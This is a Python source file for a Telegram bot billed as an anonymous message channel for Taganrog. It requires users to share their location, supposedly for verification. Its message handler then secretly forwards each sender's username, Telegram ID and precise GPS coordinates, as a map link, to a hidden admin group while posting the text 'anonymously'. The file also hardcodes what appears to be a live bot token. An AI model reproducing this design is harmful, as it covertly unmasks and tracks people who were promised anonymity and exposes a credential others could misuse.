import logging
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackContext
from telegram.error import TelegramError
from math import radians, sin, cos, sqrt, atan2

# Настройки бота
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://youtu.be/PQH1W_DRA7E"

# Координаты Таганрога (широта, долгота)
TAGANROG_COORDS = (47.2364, 38.8953)
ALLOWED_DISTANCE_KM = 50  # Максимальное допустимое расстояние от Таганрога

# Словари для хранения данных
user_message_map = {}
user_locations = {}  # Хранит подтвержденные геолокации пользователей

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# Клавиатура с кнопкой запроса геолокации
location_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("📍 Отправить геолокацию", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

def calculate_distance(lat1, lon1, lat2, lon2):
    """Вычисляет расстояние между двумя точками в километрах (формула гаверсинусов)"""
    R = 6371  # Радиус Земли в км
    
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    c = 2 * atan2(sqrt(a), sqrt(1-a))
    return R * c

async def debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для проверки работоспособности бота"""
    await update.message.reply_text(
        f"🛠 Тест бота:\n"
        f"• ID этого чата: {update.message.chat.id}\n"
        f"• Бот жив и реагирует на команды"
    )

async def request_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Запрашивает геолокацию у пользователя"""
    await update.message.reply_text(
        "Пожалуйста, подтвердите, что находитесь в Таганроге:",
        reply_markup=location_keyboard
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает полученную геолокацию"""
    user = update.message.from_user
    location = update.message.location
    
    distance = calculate_distance(
        TAGANROG_COORDS[0], TAGANROG_COORDS[1],
        location.latitude, location.longitude
    )
    
    if distance <= ALLOWED_DISTANCE_KM:
        user_locations[user.id] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'verified': True
        }
        await update.message.reply_text(
            "✅ Геолокация подтверждена! Теперь вы можете отправлять сообщения.",
            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ Вы находитесь слишком далеко от Таганрога ({distance:.1f} км). "
            "Пожалуйста, отправьте корректную геолокацию.",
            reply_markup=location_keyboard
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает текстовые сообщения"""
    if update.message.chat.type != "private":
        return
    
    user = update.message.from_user
    
    # Проверяем подтвержденную геолокацию
    if user.id not in user_locations or not user_locations[user.id]['verified']:
        await request_location(update, context)
        return
    
    try:
        logger.info(f"Новое сообщение от {user.id}: {update.message.text or 'Медиа-файл'}")

        # Отправка в анонимную группу
        sent_msg = await context.bot.send_message(
            chat_id=ANON_GROUP_ID,
            text=f"✉️ Новое анонимное сообщение:\n\n{update.message.text}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 пасматряiмо:", url=ANON_GROUP_LINK)]])
        )
        
        # Сохраняем соответствие между сообщением бота и отправителем
        user_message_map[sent_msg.message_id] = user.id
        logger.info(f"Сообщение {sent_msg.message_id} сохранено для пользователя {user.id}")

        # Пересылка в другую группу с информацией об отправителе и геолокацией
        sender_info = f"@{user.username} (ID: {user.id})" if user.username else f"ID: {user.id}"
        location = user_locations[user.id]
        location_url = f"https://maps.google.com/?q={location['lat']},{location['lon']}"
        
        full_message = (
            f"Отправитель: {sender_info}\n"
            f"📍 Геолокация: {location_url}\n\n"
            f"{update.message.text}" if update.message.text else 
            f"Отправитель: {sender_info}\n"
            f"📍 Геолокация: {location_url}"
        )

        await context.bot.send_message(
            chat_id=FORWARD_GROUP_ID,
            text=full_message
        )
        
        await update.message.forward(FORWARD_GROUP_ID)
        await update.message.reply_text("✅ Сообщение успешно отправлено админам! (есле чота нада то @kmpr0)")

    except TelegramError as e:
        logger.error(f"Ошибка Telegram: {e}")
        await update.message.reply_text(f"❌ Ошибка: {e}")
    except Exception as e:
        logger.critical(f"Критическая ошибка: {e}")
        await update.message.reply_text("⚠️ Произошла непредвиденная ошибка")

async def handle_reply(update: Update, context: CallbackContext):
    """Обрабатывает ответы на сообщения бота в группах"""
    if update.message.reply_to_message and update.message.reply_to_message.from_user.id == context.bot.id:
        replied_msg_id = update.message.reply_to_message.message_id
        
        if replied_msg_id in user_message_map:
            original_sender_id = user_message_map[replied_msg_id]
            
            try:
                reply_text = f"🔔 Ответ на ваше сообщение:\n\n{update.message.text}"
                await context.bot.send_message(
                    chat_id=original_sender_id,
                    text=reply_text
                )
                
                if not update.message.text:
                    await context.bot.forward_message(
                        chat_id=original_sender_id,
                        from_chat_id=update.message.chat.id,
                        message_id=update.message.message_id
                    )
                
                logger.info(f"Ответ переслан пользователю {original_sender_id}")
                
            except TelegramError as e:
                logger.error(f"Не удалось отправить ответ пользователю {original_sender_id}: {e}")
                if "bot was blocked by the user" in str(e):
                    await update.message.reply_text("❌ Не удалось отправить ответ - пользователь заблокировал бота")

if __name__ == "__main__":
    application = ApplicationBuilder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("debug", debug))
    application.add_handler(MessageHandler(filters.LOCATION, handle_location))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.add_handler(MessageHandler(
        filters.Chat([ANON_GROUP_ID, FORWARD_GROUP_ID]) & 
        filters.REPLY, 
        handle_reply
    ))
    
    logger.info("Бот запущен")
    application.run_polling()
